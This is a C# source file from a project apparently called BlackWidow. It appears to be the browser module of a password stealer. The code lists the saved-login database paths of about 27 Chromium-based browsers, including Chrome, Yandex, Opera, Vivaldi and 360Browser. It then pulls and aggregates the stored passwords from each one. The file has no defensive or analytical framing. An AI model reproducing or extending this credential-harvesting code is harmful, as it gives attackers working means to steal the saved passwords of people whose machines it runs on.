using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackWidow.Browser
{
    class ChromiumBrowser
    {
        public static List<BrRecover> GetPasswords()
        {
            List<BrRecover> password = new List<BrRecover>();
            string[] pathBrowser =
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Comodo\\Dragon\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Orbitum\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Torch\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Kometa\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Amigo\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Vivaldi\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Nichrome\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Maxthon5\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Maxthon5\\Users\\guest\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Epic Privacy Browser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CocCoc\\Browser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "360Browser\\Browser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Sputnik\\Sputnik\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "uCozMedia\\Uran\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CentBrowser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "7Star\\7Star\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Elements Browser\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Superbird\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Chedot\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Suhba\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Rafotech\\Mustang\\User Data\\Default\\Login Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Opera Software\\Opera Neon\\User Data\\Default\\Login Data")
            };

            for (int i = 0; i < pathBrowser.Length; i++)
            {
                List<BrRecover> allPasswords = new List<BrRecover>();
                try
                {
                    allPasswords = ChromiumBase.GetPasswords(pathBrowser[i]);
                }
                catch { }

                if (allPasswords != null)
                {
                    password.AddRange(allPasswords);
                }
            }
            return password;
        }
    }
}
